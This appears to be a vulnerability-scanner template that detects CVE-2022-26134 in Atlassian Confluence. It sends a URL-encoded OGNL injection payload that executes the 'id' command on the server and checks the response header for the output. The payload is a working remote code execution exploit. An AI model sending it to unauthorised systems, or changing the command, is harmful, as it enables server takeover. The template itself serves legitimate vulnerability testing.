id: confluence-ognl-injection
info:
  name: Atlassian Confluence OGNL Injection RCE (CVE-2022-26134)
  author: phantomscan
  severity: critical
  description: Unauthenticated OGNL expression injection in Confluence Server and Data Center HTTP request URI handler leads to arbitrary code execution.
  tags: cve,rce,confluence,atlassian,critical
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-26134
  metadata:
    cve-id: CVE-2022-26134
    cvss-score: 9.8

requests:
  - method: GET
    path:
      - "{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    matchers-condition: and
    matchers:
      - type: status
        status: [302, 200]
      - type: regex
        part: header
        regex:
          - "(?i)X-Cmd-Response:.*uid="
